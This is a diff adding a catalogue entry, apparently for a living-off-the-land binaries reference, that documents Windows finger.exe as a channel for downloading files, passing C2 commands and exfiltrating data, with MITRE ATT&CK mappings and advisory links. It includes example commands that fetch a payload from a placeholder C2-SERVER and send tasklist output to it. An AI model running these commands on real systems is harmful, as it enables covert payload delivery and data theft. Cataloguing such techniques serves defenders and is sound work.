@@ -1,0 +1,36 @@
+---
+Name: Binary.exe
+Description: Windows TCP/IP Finger.exe
+Author: John Page
+Created: October 8, 2020
+Commands:
+  - Command: finger
+    Description: Windows TCP/IP FINGER Protocol Command
+    Usecase: Download file from Internet, C2 commands, Exfil data
+    Category: Download
+    Privileges: Standard user
+    MitreID: T1105
+    MitreID: T1570
+    MitreID: TA0010
+    MitreLink: https://attack.mitre.org/techniques/T1105
+    MitreLink: https://attack.mitre.org/techniques/T1570
+    MitreLink: https://attack.mitre.org/tactics/TA0010
+    OperatingSystem: Windows 10 All
+  - Command: ">"
+    Description: Redirection operator
+    Usecase: Download files to disk
+    Download file: finger C2-Command@C2-SERVER > Malwr.txt
+    Exfil: for /f "tokens=1" %i in ('tasklist') do finger %i@C2-SERVER
+Full_Path:
+  - Path: C:\Windows\System32\finger.exe
+Code_Sample: 
+  - Code: https://github.com/hyp3rlinx/DarkFinger-C2
+Detection: 
+  - IOC: None
+Resources:
+  - Link: http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt
+  - Link: https://twitter.com/hyp3rlinx/status/1304588403120496640
+Acknowledgement:
+  - Person: John Page
+    Handle: hyp3rlinx
+---
